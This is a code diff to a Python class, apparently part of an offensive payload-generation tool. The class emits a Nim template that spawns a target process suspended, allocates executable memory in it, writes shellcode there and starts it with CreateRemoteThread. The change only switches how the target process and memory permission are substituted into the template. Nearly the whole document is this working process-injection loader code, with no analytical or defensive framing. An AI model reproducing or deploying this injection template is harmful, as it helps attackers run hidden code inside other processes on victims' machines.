@@ -1,3 +1,5 @@
+from string import Template
+
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -14,8 +16,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 {codeblocks}
 
@@ -28,13 +30,13 @@ proc main() =
 
     si.cb = sizeof(si).DWORD
 
-    CreateProcessA(nil, "{self.target}", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)
+    CreateProcessA(nil, "$target", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)
 
-    let address = VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, {self.memoryPermission})
+    let address = VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission)
     WriteProcessMemory(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, nil)
     let hThread = CreateRemoteThread(pi.hProcess, nil, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), nil, 0, nil)
     WaitForSingleObject(hThread, 500)
     CloseHandle(hThread)
 
 main()
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
